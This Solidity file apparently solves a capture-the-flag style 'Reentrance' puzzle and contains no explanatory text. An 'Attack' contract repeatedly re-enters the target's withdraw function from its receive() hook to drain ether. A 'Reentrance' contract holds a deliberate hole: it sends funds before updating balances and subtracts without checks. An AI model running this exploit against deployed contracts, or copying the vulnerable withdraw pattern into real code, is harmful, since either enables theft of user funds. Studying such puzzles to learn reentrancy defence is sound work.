// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/docs-v3.x/contracts/math/SafeMath.sol";

interface IReentrance{
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract Attack{
    IReentrance reentrance;

    constructor(address _Reentrance) public {
        reentrance = IReentrance(_Reentrance);
    }

    function steal() external payable{
        reentrance.donate{value : msg.value}(address(this));

        reentrance.withdraw(msg.value);
    }

    receive() external payable{
        uint targetBalance = address(reentrance).balance;

        if(targetBalance >= 0.001 ether){
            reentrance.withdraw(0.001 ether);
        }
    } 
}

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}